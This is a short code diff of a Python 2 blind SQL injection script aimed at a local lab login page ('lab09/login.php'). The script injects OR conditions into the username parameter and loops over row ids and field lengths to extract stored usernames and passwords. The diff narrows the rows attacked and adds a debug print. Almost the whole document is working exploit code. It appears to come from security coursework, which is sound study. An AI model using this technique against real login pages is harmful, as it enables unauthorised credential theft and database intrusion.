@@ -17,9 +17,9 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 
 listASCII=string.printable
 iterator=cycle(['username','password'])
-
-for row in xrange(0,100):
+for row in xrange(97,100):
 	field=iterator.next()
+	print field
 	size = 0;
 	for s in xrange(0,40):
 		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(s) + "--%20"
